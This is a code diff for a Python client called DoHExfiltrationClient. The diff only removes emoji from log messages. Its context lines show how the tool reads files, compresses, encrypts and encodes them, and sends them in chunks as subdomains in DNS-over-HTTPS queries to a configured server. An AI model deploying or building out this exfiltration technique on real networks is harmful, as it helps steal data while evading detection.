@@ -94,12 +94,12 @@ class DoHExfiltrationClient:
             bool: True if exfiltration succeeds, False otherwise
         """
         try:
-            print(f"🚀 Starting DoH exfiltration: {file_path}")
-            print(f"📊 Configuration: {self._config_summary()}")
+            print(f"Starting DoH exfiltration: {file_path}")
+            print(f"Configuration: {self._config_summary()}")
             
             # Check DoH connectivity before starting
             if not self._wait_for_doh_connectivity():
-                print("❌ DoH server not reachable, aborting exfiltration")
+                print("DoH server not reachable, aborting exfiltration")
                 return False
             
             # Initialize statistics
@@ -122,9 +122,9 @@ class DoHExfiltrationClient:
             self.stats['total_chunks'] = len(chunks)
             self.stats['total_bytes'] = len(data)
             
-            print(f"📦 File size: {len(data)} bytes")
-            print(f"🔀 Prepared data size: {len(prepared_data)} bytes")
-            print(f"📋 Total chunks: {len(chunks)}")
+            print(f"File size: {len(data)} bytes")
+            print(f"Prepared data size: {len(prepared_data)} bytes")
+            print(f"Total chunks: {len(chunks)}")
             
             # Send chunks
             success = self._send_chunks(chunks, session_id)
@@ -136,7 +136,7 @@ class DoHExfiltrationClient:
             return success
             
         except Exception as e:
-            print(f"❌ Exfiltration failed: {e}")
+            print(f"Exfiltration failed: {e}")
             return False
     
     def exfiltrate_data(self, data: bytes, data_name: str = "data", session_id: Optional[str] = None) -> bool:
@@ -152,12 +152,12 @@ class DoHExfiltrationClient:
             bool: True if exfiltration succeeds, False otherwise
         """
         try:
-            print(f"🚀 Starting DoH data exfiltration: {data_name}")
-            print(f"📊 Configuration: {self._config_summary()}")
+            print(f"Starting DoH data exfiltration: {data_name}")
+            print(f"Configuration: {self._config_summary()}")
             
             # Check DoH connectivity before starting
             if not self._wait_for_doh_connectivity():
-                print("❌ DoH server not reachable, aborting exfiltration")
+                print("DoH server not reachable, aborting exfiltration")
                 return False
             
             self.stats['start_time'] = time.time()
@@ -172,9 +172,9 @@ class DoHExfiltrationClient:
             self.stats['total_chunks'] = len(chunks)
             self.stats['total_bytes'] = len(data)
             
-            print(f"📦 Data size: {len(data)} bytes")
-            print(f"🔀 Prepared data size: {len(prepared_data)} bytes")
-            print(f"📋 Total chunks: {len(chunks)}")
+            print(f"Data size: {len(data)} bytes")
+            print(f"Prepared data size: {len(prepared_data)} bytes")
+            print(f"Total chunks: {len(chunks)}")
             
             success = self._send_chunks(chunks, session_id)
             
@@ -184,7 +184,7 @@ class DoHExfiltrationClient:
             return success
             
         except Exception as e:
-            print(f"❌ Data exfiltration failed: {e}")
+            print(f"Data exfiltration failed: {e}")
             return False
     
     def _read_file(self, file_path: str) -> Optional[bytes]:
@@ -193,7 +193,7 @@ class DoHExfiltrationClient:
             with open(file_path, 'rb') as f:
                 return f.read()
         except Exception as e:
-            print(f"❌ Failed to read file {file_path}: {e}")
+            print(f"Failed to read file {file_path}: {e}")
             return None
     
     def _wait_for_doh_connectivity(self, max_attempts: int = 10, delay: float = 2.0) -> bool:
@@ -207,14 +207,14 @@ class DoHExfiltrationClient:
         Returns:
             bool: True if DoH server responds, False otherwise
         """
-        print(f"🔍 Checking DoH server connectivity...")
-        print(f"📡 Testing server: {self.config.doh_server}")
+        print(f"Checking DoH server connectivity...")
+        print(f"Testing server: {self.config.doh_server}")
         
         # Test domains to verify connectivity
         test_domains = ["google.com", "cloudflare.com", "example.com"]
         
         for attempt in range(max_attempts):
-            print(f"⏳ Attempt {attempt + 1}/{max_attempts}...")
+            print(f"Attempt {attempt + 1}/{max_attempts}...")
             
             for test_domain in test_domains:
                 try:
@@ -241,29 +241,29 @@ class DoHExfiltrationClient:
                         try:
                             dns_response = response.json()
                             if "Answer" in dns_response or "Authority" in dns_response:
-                                print(f"✅ DoH server connectivity verified with {test_domain}")
-                                print(f"🎯 Server ready for exfiltration!")
+                                print(f"DoH server connectivity verified with {test_domain}")
+                                print(f"Server ready for exfiltration!")
                                 return True
                         except:
                             # Even if JSON is invalid, if we get 200, server responds
-                            print(f"✅ DoH server responding (HTTP 200) for {test_domain}")
+                            print(f"DoH server responding (HTTP 200) for {test_domain}")
                             return True
                     else:
-                        print(f"⚠️  HTTP {response.status_code} for {test_domain}")
+                        print(f"HTTP {response.status_code} for {test_domain}")
                         
                 except requests.exceptions.ConnectionError:
-                    print(f"🔌 Connection refused for {test_domain}")
+                    print(f"Connection refused for {test_domain}")
                 except requests.exceptions.Timeout:
-                    print(f"⏰ Timeout for {test_domain}")
+                    print(f"Timeout for {test_domain}")
                 except Exception as e:
-                    print(f"❌ Error testing {test_domain}: {e}")
+                    print(f"Error testing {test_domain}: {e}")
             
             if attempt < max_attempts - 1:
                 print(f"💤 Waiting {delay}s before next attempt...")
                 time.sleep(delay)
         
-        print(f"❌ DoH server not reachable after {max_attempts} attempts")
-        print(f"🔧 Please check:")
+        print(f"DoH server not reachable after {max_attempts} attempts")
+        print(f"Please check:")
         print(f"   - DoH server is running: {self.config.doh_server}")
         print(f"   - Network connectivity")
         print(f"   - Firewall settings")
@@ -310,12 +310,12 @@ class DoHExfiltrationClient:
         estimated_encoded_size = data_size * 1.4  # Approximate Base64 overhead
         estimated_chunks = int(estimated_encoded_size / chunk_size) + 1
         
-        print(f"📐 Chunk size calculation:")
-        print(f"   📄 File size: {data_size:,} bytes")
-        print(f"   🎯 Strategy: {strategy}")
-        print(f"   📏 Optimal chunk size: {chunk_size} chars")
-        print(f"   📊 Estimated chunks: {estimated_chunks:,}")
-        print(f"   ⏱️  Estimated time: {estimated_chunks * self.config.base_delay:.1f}s")
+        print(f"Chunk size calculation:")
+        print(f"   File size: {data_size:,} bytes")
+        print(f"   Strategy: {strategy}")
+        print(f"   Optimal chunk size: {chunk_size} chars")
+        print(f"   Estimated chunks: {estimated_chunks:,}")
+        print(f"   Estimated time: {estimated_chunks * self.config.base_delay:.1f}s")
         
         return chunk_size
 
@@ -330,7 +330,7 @@ class DoHExfiltrationClient:
         original_chunk_size = self.config.chunk_size
         self.config.chunk_size = optimal_chunk_size
         
-        print(f"🔧 Chunk size: {original_chunk_size} → {optimal_chunk_size} (auto-adjusted)")
+        print(f"Chunk size: {original_chunk_size} → {optimal_chunk_size} (auto-adjusted)")
         
         # Compression (if enabled)
         if self.config.compression:
@@ -342,12 +342,12 @@ class DoHExfiltrationClient:
             new_optimal = self._calculate_optimal_chunk_size(len(prepared))
             if new_optimal != optimal_chunk_size:
                 self.config.chunk_size = new_optimal
-                print(f"🔧 Post-compression adjustment: {optimal_chunk_size} → {new_optimal}")
+                print(f"Post-compression adjustment: {optimal_chunk_size} → {new_optimal}")
         
         # Encryption (if enabled)
         if self.config.encryption and self.config.encryption_key:
             prepared = self._encrypt_data(prepared)
-            print(f"🔐 Encrypted data")
+            print(f"Encrypted data")
         
         # Encoding
         if self.config.encoding == EncodingType.BASE64:
@@ -361,7 +361,7 @@ class DoHExfiltrationClient:
         else:
             encoded = base64.urlsafe_b64encode(prepared).decode('ascii')
         
-        print(f"🔢 Encoded with {self.config.encoding.value}: {len(encoded)} chars")
+        print(f"Encoded with {self.config.encoding.value}: {len(encoded)} chars")
         return encoded
     
     def _encrypt_data(self, data: bytes) -> bytes:
@@ -419,17 +419,17 @@ class DoHExfiltrationClient:
 
     def _send_chunks(self, chunks: List[str], session_id: str) -> bool:
         """Send all chunks via DoH with time estimation"""
-        print(f"\n📡 Starting chunk transmission...")
-        print(f"🆔 Session ID: {session_id}")
+        print(f"\nStarting chunk transmission...")
+        print(f"Session ID: {session_id}")
         
         # Estimate transmission time
         estimated_time = self._estimate_transmission_time(chunks)
-        print(f"⏱️  Estimated transmission time: {estimated_time:.1f}s")
+        print(f"Estimated transmission time: {estimated_time:.1f}s")
         
         # Display efficiency overview
         total_chars = sum(len(chunk) for chunk in chunks)
         efficiency = (total_chars / len(chunks)) / self.config.chunk_size * 100 if self.config.chunk_size > 0 else 0
-        print(f"📊 Chunk utilization: {efficiency:.1f}%")
+        print(f"Chunk utilization: {efficiency:.1f}%")
         
         all_success = True
         start_time = time.time()
@@ -441,7 +441,7 @@ class DoHExfiltrationClient:
                 progress = (i / len(chunks)) * 100
                 if i > 0:
                     eta = (elapsed / i) * (len(chunks) - i)
-                    print(f"📈 Progress: {progress:.1f}% ({i}/{len(chunks)}) - ETA: {eta:.1f}s")
+                    print(f"Progress: {progress:.1f}% ({i}/{len(chunks)}) - ETA: {eta:.1f}s")
             
             success = self._send_single_chunk(chunk, i, len(chunks), session_id)
             
@@ -457,8 +457,8 @@ class DoHExfiltrationClient:
         
         success_rate = (self.stats['successful_chunks'] / self.stats['total_chunks']) * 100
         actual_time = time.time() - start_time
-        print(f"\n📊 Transmission complete: {success_rate:.1f}% success rate")
-        print(f"⏱️  Actual time: {actual_time:.1f}s (estimated: {estimated_time:.1f}s)")
+        print(f"\nTransmission complete: {success_rate:.1f}% success rate")
+        print(f"Actual time: {actual_time:.1f}s (estimated: {estimated_time:.1f}s)")
         
         return all_success
     
@@ -492,19 +492,19 @@ class DoHExfiltrationClient:
                 )
                 
                 if response.status_code == 200:
-                    print(f"✅ [{index+1:3d}/{total}] Sent chunk: {subdomain[:50]}...")
+                    print(f"[{index+1:3d}/{total}] Sent chunk: {subdomain[:50]}...")
                     return True
                 else:
-                    print(f"⚠️  [{index+1:3d}/{total}] HTTP {response.status_code}: {subdomain[:30]}...")
+                    print(f"[{index+1:3d}/{total}] HTTP {response.status_code}: {subdomain[:30]}...")
                     
             except Exception as e:
-                print(f"❌ [{index+1:3d}/{total}] Attempt {attempt+1} failed: {e}")
+                print(f"[{index+1:3d}/{total}] Attempt {attempt+1} failed: {e}")
                 
                 if attempt < self.config.max_retries:
                     time.sleep(self.config.retry_delay)
                     self.stats['retries'] += 1
         
-        print(f"💥 [{index+1:3d}/{total}] All attempts failed for chunk")
+        print(f"[{index+1:3d}/{total}] All attempts failed for chunk")
         return False
     
     def _build_subdomain(self, chunk: str, index: int, total: int, session_id: str) -> str:
@@ -581,11 +581,11 @@ class DoHExfiltrationClient:
         throughput = self.stats['total_bytes'] / duration if duration > 0 else 0
         
         print(f"\n📈 EXFILTRATION STATISTICS:")
-        print(f"   ⏱️  Duration: {duration:.2f} seconds")
-        print(f"   📦 Total chunks: {self.stats['total_chunks']}")
-        print(f"   ✅ Successful: {self.stats['successful_chunks']}")
-        print(f"   ❌ Failed: {self.stats['failed_chunks']}")
-        print(f"   🔄 Retries: {self.stats['retries']}")
-        print(f"   📊 Success rate: {(self.stats['successful_chunks']/self.stats['total_chunks']*100):.1f}%")
-        print(f"   🚀 Throughput: {throughput:.2f} bytes/sec")
-        print(f"   📈 Total bytes: {self.stats['total_bytes']}")
+        print(f"   Duration: {duration:.2f} seconds")
+        print(f"   Total chunks: {self.stats['total_chunks']}")
+        print(f"   Successful: {self.stats['successful_chunks']}")
+        print(f"   Failed: {self.stats['failed_chunks']}")
+        print(f"   Retries: {self.stats['retries']}")
+        print(f"   Success rate: {(self.stats['successful_chunks']/self.stats['total_chunks']*100):.1f}%")
+        print(f"   Throughput: {throughput:.2f} bytes/sec")
+        print(f"   Total bytes: {self.stats['total_bytes']}")
